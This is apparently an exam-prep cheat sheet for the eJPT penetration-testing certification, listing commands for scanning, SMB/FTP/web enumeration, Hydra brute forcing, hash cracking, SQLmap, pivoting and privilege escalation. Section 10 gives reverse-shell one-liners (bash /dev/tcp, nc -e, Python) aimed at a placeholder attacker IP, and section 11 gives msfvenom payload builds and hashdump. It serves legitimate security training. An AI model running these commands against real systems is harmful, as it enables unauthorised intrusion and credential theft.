# eJPT Exam Cheat Sheet

*Quick reference --- keep this open in a second tab or printed beside
you during the exam.*

------------------------------------------------------------------------

## Before You Touch a Single Command

1.  Read **all 35 questions** first, start to finish. Don't skim ---
    actually read them.
2.  While reading, build a simple table mapping each question to what
    will probably answer it (Nmap output / SMB / a specific host / web
    app / etc). Full method and template → see
    `eJPT_Complete_Study_Guide.md`, Part 11.
3.  Only start scanning once you've done that.
4.  Stuck on something for 45+ minutes (especially privilege
    escalation)? Stop and re-read the *exact* wording of the related
    question. It usually tells you that you're overbuilding the solution
    --- you may need far less than you think (a password, not a full
    root shell; a login, not a full privesc chain).

------------------------------------------------------------------------

## 1. Host Discovery

``` bash
ip a s                                   # Your own IP / interfaces
ip route                                 # Routing table, network range
nmap -sn 192.168.1.0/24                  # Ping sweep — fastest first look
netdiscover -r 192.168.1.0/24            # ARP-based live host discovery
arp-scan -l                              # Local network ARP scan
fping -a -g 192.168.1.0/24               # Alternative fast sweep
```

## 2. Port Scanning

``` bash
nmap -sV -sC -O -p- -oN full_scan.txt <target-ip>   # Full scan, saved — run this first, on every host
nmap -sV --script vuln <target-ip>                  # Vulnerability scripts (slow — let it run in background)
nmap -p- --min-rate 10000 -T4 <target-ip>           # Fast full-port scan if -p- is too slow
nmap -sU --top-ports 100 <target-ip>                # Top 100 UDP ports
```

> Always save output with `-oN`. You'll be scrolling back through it all
> day.

## 3. SMB --- Port 445 (high-yield on eJPT, check this thoroughly)

``` bash
enum4linux -a <target-ip>
smbclient -L //<target-ip>/ -N
smbclient //<target-ip>/share_name -N
smbmap -H <target-ip>
crackmapexec smb <target-ip>
nmap -p445 --script smb-enum-shares,smb-enum-users,smb-os-discovery <target-ip>
nmap -p445 --script smb-vuln-ms17-010 <target-ip>    # EternalBlue check
```

## 4. FTP --- Port 21

``` bash
ftp <target-ip>                                       # try anonymous / anonymous, or anonymous / blank
nmap --script ftp-anon <target-ip>
wget -r ftp://anonymous:anonymous@<target-ip>/
```

## 5. SSH --- Port 22

``` bash
ssh user@<target-ip>
hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://<target-ip>
ssh2john id_rsa > ssh_hash.txt && john ssh_hash.txt   # if you find a private key
```

## 6. HTTP/Web --- Port 80 / 443 / 8080

``` bash
whatweb <target-ip>                        # quick tech fingerprint
curl -I http://<target-ip>                 # headers only
gobuster dir -u http://<target-ip> -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
nikto -h http://<target-ip>
```

Route anything with logins, parameters, or forms through **Burp Suite**
(proxy `127.0.0.1:8080`) --- you'll need it for SQLi/XSS-style
questions.

## 7. MySQL --- Port 3306

``` bash
mysql -u root -p -h <target-ip>
nmap --script mysql-empty-password <target-ip>
# once connected: show databases; use <db>; show tables; select * from users;
```

## 8. RDP --- Port 3389

``` bash
xfreerdp /v:<target-ip> /u:<user> /p:<password>
nmap --script rdp-enum-encryption <target-ip>
hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://<target-ip>
```

## 9. Other Enumeration Worth Checking

``` bash
theHarvester -d <domain> -b all                       # OSINT — emails, subdomains
nmap -sV -p25 --script smtp-enum-users <target-ip>     # SMTP user enumeration
nmap -sU -p161 --script snmp-info <target-ip>          # SNMP
searchsploit <service name and version>                # offline exploit-DB search
```

## 10. Reverse Shells & Netcat

``` bash
# Listener on your machine:
nc -lvnp 4444

# Bash one-liner (most reliable — works even where nc has no -e):
bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1

# Netcat -e (only works if the target's nc build supports it):
nc -e /bin/sh <attacker-ip> 4444           # Linux
ncat --exec cmd.exe <attacker-ip> 4444     # Windows, via ncat

# Python fallback:
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker-ip>",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/sh","-i"])'

# Stabilize the shell once you're in:
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# then Ctrl+Z, run: stty raw -echo; fg

# File transfer over netcat:
nc -lvnp 4444 > received_file              # on the receiving side
nc <attacker-ip> 4444 < file_to_send       # on the sending side
```

> Not sure which shell will actually work on the target? revshells.com
> generates the right variant for whatever's available.

## 11. Metasploit & Meterpreter

``` bash
msfconsole
search <exploit_name>
use <module_path>
show options
set RHOSTS <target-ip>
set LHOST <your-ip>
set LPORT 4444
set PAYLOAD <payload>
exploit

# Standalone payload generation:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your-ip> LPORT=4444 -f exe -o shell.exe
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<your-ip> LPORT=4444 -f elf -o shell.elf
```

**Meterpreter:**

``` bash
sysinfo / getuid / ps / ls / cd / cat / download / upload / shell
hashdump                                          # Windows password hashes
use post/linux/gather/hashdump                    # Linux hashes
getsystem                                         # attempt automatic priv esc (Windows)
use post/multi/recon/local_exploit_suggester      # suggest priv esc paths
background / sessions -l / sessions -i <id>
```

## 12. Brute Force (Hydra)

``` bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://<target-ip>
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://<target-ip>
hydra -l admin -P /usr/share/wordlists/rockyou.txt rdp://<target-ip>
hydra -l admin -P /usr/share/wordlists/rockyou.txt smb://<target-ip>
hydra -l admin -P /usr/share/wordlists/rockyou.txt <target-ip> http-post-form \
  "/login.php:user=^USER^&pass=^PASS^:F=invalid"
```

`-l` single user · `-L` user list · `-p`/`-P` same for password · `-t`
threads (default 16)

## 13. Hash Cracking

``` bash
john hash.txt                                              # auto-detect format
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --format=nt hash.txt                                  # Windows NTLM
john --show hash.txt

hashid <hash>                                               # identify hash type first
unshadow passwd.txt shadow.txt > combined.txt && john combined.txt   # /etc/passwd + /etc/shadow together
zip2john file.zip > zip_hash.txt && john zip_hash.txt
```

## 14. Web App Testing --- SQLmap

``` bash
sqlmap -u "http://<target-ip>/page.php?id=1" --batch
sqlmap -u "http://<target-ip>/page.php?id=1" --dbs --batch
sqlmap -u "http://<target-ip>/page.php?id=1" -D <db_name> --tables --batch
sqlmap -u "http://<target-ip>/page.php?id=1" -D <db_name> -T <table> --dump --batch
```

## 15. Pivoting

``` bash
# In Meterpreter, after backgrounding a session:
run autoroute -s 192.168.100.0/24
run autoroute -p                             # print current routes

meterpreter > portfwd add -l 1234 -p 80 -r <internal-target-ip>
meterpreter > portfwd list

use auxiliary/server/socks_proxy
set SRVPORT 9050
run

proxychains nmap -sT -Pn <internal-target-ip>
```

> After every shell you get: check `ipconfig` / `ifconfig` for a
> **second** network interface. That's the signal there's a hidden
> network to pivot into.

## 16. Privilege Escalation --- Linux

``` bash
sudo -l                                        # what can I run as root?
find / -perm -4000 -type f 2>/dev/null         # SUID binaries — cross-check against GTFOBins
getcap -r / 2>/dev/null                        # binaries with capabilities set
cat /etc/crontab; crontab -l                   # scheduled jobs
uname -a                                       # kernel version — check searchsploit for it
find / -writable -type d 2>/dev/null           # writable directories
cat /etc/passwd | grep sh$                     # users with a real shell
# Or transfer linpeas.sh over and run it — automates most of the above
```

## 17. Privilege Escalation --- Windows

``` cmd
whoami /priv
whoami /groups
systeminfo
wmic qfe get Caption,HotFixID
net user
net localgroup administrators
schtasks /query /fo LIST /v
wmic service get name,displayname,startmode,pathname
:: Or transfer winPEAS.exe over and run it — automates most of the above
```

## 18. Wordlist Locations

    /usr/share/wordlists/rockyou.txt
    /usr/share/seclists/                                                   # if installed
    /usr/share/wordlists/dirb/common.txt
    /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
    /usr/share/metasploit-framework/data/wordlists/unix_users.txt
    /usr/share/metasploit-framework/data/wordlists/common_users.txt

## 19. Exam-Day Checklist

1.  Full Nmap scan (`-p-`, never skip it) on **every** live host before
    anything else.
2.  All 35 questions read once, question-map built, *before* attacking.
3.  Answer the easy scan-derived questions immediately --- usually 8--12
    come straight from Nmap.
4.  Work host-by-host after that, matching what you find back to your
    question map.
5.  Stuck 45--60+ minutes on one thing? Re-read the exact question ---
    don't just push harder.
6.  Break every 2 hours.
7.  Write down every credential the second you find it.
8.  rockyou.txt cracks more than you'd expect --- try it before reaching
    for anything fancier.
9.  Don't rabbit-hole a machine that isn't giving you any question hits
    --- move on, come back later.

------------------------------------------------------------------------

*Companion file: `eJPT_Complete_Study_Guide.md` --- Part 11 has the full
centralized note-taking method and a ready-to-use tracking template.*
